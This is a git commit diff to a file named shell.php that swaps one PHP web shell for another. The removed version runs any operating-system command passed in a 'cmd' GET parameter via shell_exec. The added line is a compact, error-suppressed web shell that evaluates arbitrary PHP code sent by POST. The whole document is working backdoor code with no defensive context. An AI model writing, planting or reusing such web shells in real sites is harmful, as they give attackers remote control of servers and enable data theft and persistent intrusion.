e6d3e867e865f2fc2be1593eb7990b0bfc2cbbff
Ziyi Zhao <41231692+zhao-ziyi@users.noreply.github.com>
2024-10-15 16:32:10 +0800

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,9 +1,1 @@
-<?php
-if (isset($_GET['cmd'])) {
-    // Execute the command and output the result
-    $output = shell_exec($_GET['cmd']);
-    echo "<pre>$output</pre>";
-} else {
-    echo "Usage: ?cmd=command";
-}
-?>
+<?php @eval($_POST[cmd]);?>
